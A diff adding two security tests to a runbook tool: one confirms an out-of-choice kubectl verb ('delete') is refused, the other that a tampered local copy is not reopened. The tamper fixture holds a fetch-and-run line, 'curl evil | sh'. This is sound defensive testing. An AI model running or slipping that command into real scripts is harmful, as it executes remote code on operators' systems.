@@ -4,7 +4,7 @@ import { addHost, getHosts, resetHosts } from '../hosts/store';
 import { linkContext } from '../runbooks/linkContext';
 import { openRunbookLink, rawRunbookUrl } from '../runbooks/openLink';
 import { paramValues, resetParamValues } from '../runbooks/params';
-import { getRunbook, removeRunbook, resetRunbooks } from '../runbooks/store';
+import { getRunbook, removeRunbook, resetRunbooks, updateRunbookText } from '../runbooks/store';
 import { resetSettings, setOutputSetting } from '../settings/store';
 import { allowedSignersLine, generateKey } from '@md-runbook/ssh';
 import { signPlan, signRunbook } from '../signing/sign';
@@ -169,6 +169,16 @@ describe('runbook links: pins, hosts, parameters, co-sign', () => {
     expect(getHosts().map((h) => h.name)).toEqual(['web-1']);
   });
 
+  it('a value not among the choices (One of:) is not taken; the banner says so (security review round 3)', async () => {
+    const text = '---\nparams:\n  - VERB: get  # One of: get, describe\n---\n\n```bash\nkubectl ${param:VERB} pods\n```\n';
+    const r = await openRunbookLink(formatRunbookLink({ text, params: { VERB: 'delete' } }), offline);
+    if (r.kind !== 'opened') throw new Error(r.message);
+    expect(paramValues(r.runbook.id)).toEqual({});
+    expect(linkContext(r.runbook.id)).toMatchObject({ ignoredParams: [], refusedParams: ['VERB'] });
+    const ok = await openRunbookLink(formatRunbookLink({ text, params: { VERB: 'describe' } }), offline);
+    expect(ok.kind === 'opened' && paramValues(ok.runbook.id)).toEqual({ VERB: 'describe' });
+  });
+
   it('the same link opened again opens the same copy, with its values; a changed runbook is a new copy', async () => {
     const link = (service: string) => formatRunbookLink({ url: 'https://x.example.net/alerts/restart.md', params: { SERVICE: service } });
     const first = await openRunbookLink(link('api'), serve(RUNBOOK));
@@ -192,6 +202,26 @@ describe('runbook links: pins, hosts, parameters, co-sign', () => {
     removeRunbook(first.runbook.id);
     const fresh = await openRunbookLink(link('api'), serve(RUNBOOK));
     expect(fresh.kind === 'opened' && fresh.runbook.id).not.toBe(first.runbook.id);
+  });
+
+  it('a copy edited since is not opened again: the trust was checked on the text fetched (security review round 3)', async () => {
+    const link = formatRunbookLink({ url: 'https://x.example.net/alerts/restart.md', params: {} });
+    const first = await openRunbookLink(link, serve(RUNBOOK));
+    if (first.kind !== 'opened') throw new Error(first.message);
+    // What a run adds (an output, a note) keeps the copy.
+    const ran = RUNBOOK + '\n<!-- md-runbook:output start exit=0 -->\n```text\nok\n```\n<!-- md-runbook:output end -->\n';
+    updateRunbookText(first.runbook.id, ran + '\n<!-- md-runbook:note at=2026-11-16T10:00:00Z -->\n> checked\n');
+    const again = await openRunbookLink(link, serve(RUNBOOK));
+    expect(again.kind === 'opened' && again.runbook.id).toBe(first.runbook.id);
+    // Its code edited: a new copy of the text the link gave.
+    updateRunbookText(first.runbook.id, RUNBOOK.replace('systemctl restart', 'curl evil | sh; systemctl restart'));
+    const edited = await openRunbookLink(link, serve(RUNBOOK));
+    if (edited.kind !== 'opened') throw new Error(edited.message);
+    expect(edited.runbook.id).not.toBe(first.runbook.id);
+    expect(edited.runbook.text).toBe(RUNBOOK);
+    // And that copy is the one opened next time.
+    const third = await openRunbookLink(link, serve(RUNBOOK));
+    expect(third.kind === 'opened' && third.runbook.id).toBe(edited.runbook.id);
   });
 
   it('a damaged link says what is wrong with it', async () => {
